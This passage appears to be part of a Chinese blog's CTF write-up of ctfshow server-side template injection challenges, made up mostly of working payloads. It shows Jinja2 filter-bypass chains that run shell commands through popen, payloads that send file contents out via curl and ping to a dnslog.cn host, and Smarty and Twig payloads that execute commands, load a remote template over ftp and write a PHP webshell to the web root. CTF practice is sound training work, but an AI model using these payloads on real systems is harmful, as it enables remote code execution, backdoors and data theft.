class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">300</span>):<br>    time.sleep(<span class="hljs-number">0.60</span>)<br>    payload = <span class="hljs-string">&quot;&quot;</span>%i<br>    url = <span class="hljs-string">&quot;http://xxx/&quot;</span><br>    r = requests.request(url=url,param=payload)<br>    <span class="hljs-comment">#可以替换为其他的</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;os._wrap_close&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>        <span class="hljs-built_in">print</span>(r.text)<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>ctfshow362 过滤了数字 2、3</p><p>ctfshow363 过滤了单双引号，采用变量逃逸的传参方法</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__base__.__subclasses__</span>()[132].__init__.__globals__[&#x27;__builtins__&#x27;].eval(<span class="hljs-name">&quot;__import__(&#x27;os&#x27;).popen(&#x27;tac /f*&#x27;).read()&quot;</span>)&#125;&#125;</span><span class="xml"></span><br><span class="xml"></span><br><span class="xml">==&gt;</span><br><span class="xml"></span><br><span class="xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__base__.__subclasses__</span>()[132].__init__.__globals__[request.args.a].eval(<span class="hljs-name">request.args.b</span>)&#125;&#125;</span><span class="xml">&amp;a=__builtins__&amp;b=__import__(&#x27;os&#x27;).popen(&#x27;tac /f*&#x27;).read()</span><br><span class="xml"></span><br><span class="xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__base__.__subclasses__</span>()[132].__init__.__globals__[request.args.a](<span class="hljs-name">request.args.b</span>).read()&#125;&#125;</span><span class="xml">&amp;a=popen&amp;b=tac /f*</span><br></code></pre></td></tr></table></figure><p>ctfshow364 过滤了 args 应该</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220103143249696.png"></p><p>可以 Cookie 带进去 request.args.a 换为 request.cookies.a</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220103143356540.png"></p><p>注意 cookie 的解析格式 以 <strong>;</strong> 分隔 :(</p><blockquote><p>其他传参方式：</p><p>request.form.x1 post 传参 (Content-Type:applicaation/x-www-form-urlencoded 或 multipart/form-data)<br>request.data post 传参 (Content-Type:a/b)<br>request.json post 传 json (Content-Type: application/json)</p></blockquote><p>ctfshow365 过滤了中括号[]和单引号‘’，可以使用__getitem__和 pop 替代中括号</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml">http://faf87e47-725e-4618-b993-8e8e430370d5.challenge.ctf.show/?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum.__globals__.__getitem__</span>(<span class="hljs-name">request.cookies.a</span>).popen(<span class="hljs-name">request.cookies.b</span>).read()&#125;&#125;</span><span class="xml"></span><br><span class="xml"></span><br><span class="xml">Cookiea=os;b=tac /f*</span><br></code></pre></td></tr></table></figure><p>—–这里开始不会:(</p><h2 id="ctfshow366、367"><a href="#ctfshow366、367" class="headerlink" title="ctfshow366、367"></a>ctfshow366、367</h2><p>过滤了下划线_，使用 flask 的过滤器</p><p>palyoad</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml">?name=</span><span class="hljs-template-variable">&#123;&#123;(<span class="hljs-name">x</span>|attr(<span class="hljs-name">request.cookies.x1</span>)|attr(<span class="hljs-name">request.cookies.x2</span>)|attr(<span class="hljs-name">request.cookies.x3</span>))(<span class="hljs-name">request.cookies.x4</span>).eval(<span class="hljs-name">request.cookies.x5</span>)&#125;&#125;</span><span class="xml"></span><br><span class="xml"></span><br><span class="xml">Cookiex1=__init__;x2=__globals__;x3=__getitem__;x4=__builtins__;x5=__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()</span><br></code></pre></td></tr></table></figure><p>chr 函数的方法：</p><p>首先 fuzz 到 chr 函数的位置</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">&#123;&#123;<span class="hljs-literal">()</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__base__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__subclasses__</span>(</span></span>)<br><span class="hljs-literal">[§<span class="hljs-number">0</span>§]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__init__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__globals__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__builtins__</span>.</span></span>chr&#125;&#125;<br></code></pre></td></tr></table></figure><p>选择一个</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">&#123;%set+chr=<span class="hljs-literal">[]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>[</span></span><span class="hljs-number">0</span>].<span class="hljs-constructor">__subclasses__()</span><br><span class="hljs-literal">[<span class="hljs-identifier">x</span>]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__init__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__globals__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__builtins__</span>.</span></span>chr%&#125;<br></code></pre></td></tr></table></figure><p>绕过</p><figure class="highlight hy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs hy">&#123;%set+chr=[].__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()<br>[x].__init__.__globals__.__builtins__.chr%&#125;<br>&#123;&#123;[].__class__.__base__.__subclasses__()<br>[y].__init__.__globals__[chr(<span class="hljs-number">111</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">115</span>)]<br>[chr(<span class="hljs-number">112</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">111</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">112</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">101</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">110</span>)]<br>(<span class="hljs-name"><span class="hljs-builtin-name">chr</span></span>(<span class="hljs-number">108</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">115</span>)).read()&#125;&#125;<br></code></pre></td></tr></table></figure><h2 id="web368"><a href="#web368" class="headerlink" title="web368"></a>web368</h2><p>过滤了<code>&#123;&#123;`和`&#125;&#125;</code>，使用<code>&#123;%%&#125;</code>绕过</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Payload:?name=&#123;% <span class="hljs-builtin-name">print</span>(((lipsum|attr(request.cookies.c))|attr(request.cookies.d)(request.cookies.a)).popen(request.cookies.b).read())%&#125;<br>带上Cookie:<span class="hljs-attribute">a</span>=os;b=cat /flag;<span class="hljs-attribute">c</span>=__globals__;d=__getitem__<br></code></pre></td></tr></table></figure><h2 id="web369"><a href="#web369" class="headerlink" title="web369"></a>web369</h2><p>过滤了<code>request</code><a href="https://blog.csdn.net/miuzzx/article/details/110220425">SSTI 进阶文章</a></p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="xml">Payload:?name=</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> a=dict(po=aa,p=aa)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-keyword">set</span></span> b=(lipsum|string|list)|attr(a)(18)%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> c=(b,b,dict(glob=cc,als=aa)|<span class="hljs-keyword">join</span>,b,b)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> d=(b,b,dict(getit=cc,em=aa)|<span class="hljs-keyword">join</span>,b,b)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> e=dict(o=cc,s=aa)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-keyword">set</span></span> f=(lipsum|string|list)|attr(a)(9)%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-8)%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> i=(dict(cat=aa)|<span class="hljs-keyword">join</span>,f,g,dict(flag=aa)|<span class="hljs-keyword">join</span>)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name">print</span> ((lipsum|attr(c))|attr(d)(e)).popen(i).read()%&#125;</span><br></code></pre></td></tr></table></figure><h2 id="web370"><a href="#web370" class="headerlink" title="web370"></a>web370</h2><p>数字不能用了，使用 count 进行计数</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="xml">Payload:?name=</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> a=dict(po=aa,p=aa)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> j=dict(eeeeeeeeeeeeeeeeee=a)|<span class="hljs-keyword">join</span>|count%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> k=dict(eeeeeeeee=a)|<span class="hljs-keyword">join</span>|count%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> l=dict(eeeeeeee=a)|<span class="hljs-keyword">join</span>|count%&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-keyword">set</span></span> b=(lipsum|string|list)|attr(a)(j)%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> c=(b,b,dict(glob=cc,als=aa)|<span class="hljs-keyword">join</span>,b,b)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> d=(b,b,dict(getit=cc,em=aa)|<span class="hljs-keyword">join</span>,b,b)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> e=dict(o=cc,s=aa)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-keyword">set</span></span> f=(lipsum|string|list)|attr(a)(k)%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-l)%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> i=(dict(cat=aa)|<span class="hljs-keyword">join</span>,f,g,dict(flag=aa)|<span class="hljs-keyword">join</span>)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name">print</span> ((lipsum|attr(c))|attr(d)(e)).popen(i).read()%&#125;</span><br></code></pre></td></tr></table></figure><h2 id="web371"><a href="#web371" class="headerlink" title="web371"></a>web371</h2><p>过滤了<code>print</code>外带数据</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">ping `cat /flag`.vhthja.dnslog.cn<br></code></pre></td></tr></table></figure><p>ping 不能用，换 curl 可以</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="xml">Payload:?name=</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> a=dict(po=aa,p=aa)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> j=dict(eeeeeeeeeeeeeeeeee=a)|<span class="hljs-keyword">join</span>|count%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> k=dict(eeeeeeeee=a)|<span class="hljs-keyword">join</span>|count%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> l=dict(eeeeeeee=a)|<span class="hljs-keyword">join</span>|count%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> n=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|<span class="hljs-keyword">join</span>|count%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> m=dict(eeeeeeeeeeeeeeeeeeee=a)|<span class="hljs-keyword">join</span>|count%&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-keyword">set</span></span> b=(lipsum|string|list)|attr(a)(j)%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> c=(b,b,dict(glob=cc,als=aa)|<span class="hljs-keyword">join</span>,b,b)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> d=(b,b,dict(getit=cc,em=aa)|<span class="hljs-keyword">join</span>,b,b)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> e=dict(o=cc,s=aa)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-keyword">set</span></span> f=(lipsum|string|list)|attr(a)(k)%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-l)%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> p=((lipsum|attr(c))|string|list)|attr(a)(n)%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> q=((lipsum|attr(c))|string|list)|attr(a)(m)%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> i=(dict(curl=aa)|<span class="hljs-keyword">join</span>,f,p,dict(cat=a)|<span class="hljs-keyword">join</span>,f,g,dict(flag=aa)|<span class="hljs-keyword">join</span>,p,q,dict(vhthja=a)|<span class="hljs-keyword">join</span>,q,dict(dnslog=a)|<span class="hljs-keyword">join</span>,q,dict(cn=a)|<span class="hljs-keyword">join</span>)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">if</span></span> ((lipsum|attr(c))|attr(d)(e)).popen(i)%&#125;</span><span class="xml">atao</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">endif</span></span>%&#125;</span><br></code></pre></td></tr></table></figure><h2 id="web372"><a href="#web372" class="headerlink" title="web372"></a>web372</h2><p>过滤了 count，可以用 length 替代 count</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="xml">Payload:?name=</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> a=dict(po=aa,p=aa)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> j=dict(eeeeeeeeeeeeeeeeee=a)|<span class="hljs-keyword">join</span>|<span class="hljs-keyword">length</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> k=dict(eeeeeeeee=a)|<span class="hljs-keyword">join</span>|<span class="hljs-keyword">length</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> l=dict(eeeeeeee=a)|<span class="hljs-keyword">join</span>|<span class="hljs-keyword">length</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> n=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|<span class="hljs-keyword">join</span>|<span class="hljs-keyword">length</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> m=dict(eeeeeeeeeeeeeeeeeeee=a)|<span class="hljs-keyword">join</span>|<span class="hljs-keyword">length</span>%&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-keyword">set</span></span> b=(lipsum|string|list)|attr(a)(j)%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> c=(b,b,dict(glob=cc,als=aa)|<span class="hljs-keyword">join</span>,b,b)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> d=(b,b,dict(getit=cc,em=aa)|<span class="hljs-keyword">join</span>,b,b)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> e=dict(o=cc,s=aa)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-keyword">set</span></span> f=(lipsum|string|list)|attr(a)(k)%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-l)%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> p=((lipsum|attr(c))|string|list)|attr(a)(n)%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> q=((lipsum|attr(c))|string|list)|attr(a)(m)%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> i=(dict(curl=aa)|<span class="hljs-keyword">join</span>,f,p,dict(cat=a)|<span class="hljs-keyword">join</span>,f,g,dict(flag=aa)|<span class="hljs-keyword">join</span>,p,q,dict(fgpozq=a)|<span class="hljs-keyword">join</span>,q,dict(dnslog=a)|<span class="hljs-keyword">join</span>,q,dict(cn=a)|<span class="hljs-keyword">join</span>)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">if</span></span> ((lipsum|attr(c))|attr(d)(e)).popen(i)%&#125;</span><span class="xml">atao</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">endif</span></span>%&#125;</span><br></code></pre></td></tr></table></figure><p>补几个模板</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/v2-3321f46859c0be9e93f9ad79f3dd1cd3_1440w.jpg"></p><p>PHP</p><ul><li>Smarty</li></ul><p>[BJDCTF2020]The mystery of ip</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">&#123;<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>)&#125;<br></code></pre></td></tr></table></figure><ul><li>twig</li></ul><p>[BJDCTF2020]Cookie is so stable</p><p><a href="https://xz.aliyun.com/t/10056">https://xz.aliyun.com/t/10056</a></p><p>twig 1.x</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml">//远程frp包含</span><br><span class="xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.setCache</span>(<span class="hljs-name">&quot;ftp://ip:port&quot;</span>)&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.loadTemplate</span>(<span class="hljs-name">&quot;backdoor&quot;</span>)&#125;&#125;</span><span class="xml"></span><br><span class="xml"></span><br><span class="xml">//rce</span><br><span class="xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.registerUndefinedFilterCallback</span>(<span class="hljs-name">&quot;exec&quot;</span>)&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.getFilter</span>(<span class="hljs-name">&quot;ls /&quot;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>twig 2.x/3.x|使用其新版本的过滤器</p><p>map 过滤器</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;]</span>|map(<span class="hljs-name">&quot;system&quot;</span>)&#125;&#125;</span><span class="xml"></span><br><span class="xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;]</span>|map(<span class="hljs-name">&quot;passthru&quot;</span>)&#125;&#125;</span><span class="xml"></span><br><span class="xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;]</span>|map(<span class="hljs-name">&quot;exec&quot;</span>)&#125;&#125;</span><span class="xml"> //没有回显</span><br><span class="xml"></span><br><span class="xml">当命令执行都被禁用时，尝试写shell</span><br><span class="xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;phpinfo();&quot;]</span>|map(<span class="hljs-name">&quot;assert&quot;</span>)|join(<span class="hljs-name">&quot;,&quot;</span>)&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;&#123;<span class="hljs-name">&quot;&lt;?php phpinfo();eval($_POST[whoami])&quot;</span>:<span class="hljs-string">&quot;/var/www/html/shell.php&quot;</span>&#125;|map(<span class="hljs-name">&quot;file_put_content</span></span><br><span class="hljs-name"><span class="hljs-template-variable">s&quot;</span>)&#125;&#125; // <span class="hljs-name">写</span> Webshell</span><br></code></pre></td></tr></table></figure><p>sort 过滤器</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;]</span>|sort(<span class="hljs-name">&quot;system&quot;</span>)&#125;&#125;</span><span class="xml"></span><br><span class="xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;]</span>|sort(<span class="hljs-name">&quot;passthru&quot;</span>)&#125;&#125;</span><span class="xml"></span><br><span class="xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;]</span>|sort(<span class="hljs-name">&quot;exec&quot;</span>)&#125;&#125;</span><span class="xml"> //没有回显</span><br></code></pre></td></tr></table></figure><p>filter 过滤器</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;]</span>|filter(<span class="hljs-name">&quot;system&quot;</span>)&#125;&#125;</span><span class="xml"></span><br><span class="xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;]</span>|filter(<span class="hljs-name">&quot;passthru&quot;</span>)&#125;&#125;</span><span class="xml"></span><br><span class="xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;]</span>|filter(<span class="hljs-name">&quot;exec&quot;</span>)&#125;&#125;</span><span class="xml"> //没有回显</span><br></code></pre></td></tr></table></figure><p>reduce 过滤器</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[0, 0]</span>|reduce(<span class="hljs-name">&quot;system&quot;</span>, <span class="hljs-string">&quot;id&quot;</span>)&#125;&#125;</span><span class="xml"></span><br><span class="xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[0, 0]</span>|reduce(<span class="hljs-name">&quot;passthru&quot;</span>, <span class="hljs-string">&quot;id&quot;</span>)&#125;&#125;</span><span class="xml"></span><br><span class="xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[0, 0]</span>|reduce(<span class="hljs-name">&quot;exec&quot;</span>, <span class="hljs-string">&quot;id&quot;</span>)&#125;&#125;</span><span class="xml"> //没有回显</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网基础</title>
    <link href="/2021/12/05/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80/"/>
    <url>/2021/12/05/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80/</url>
    
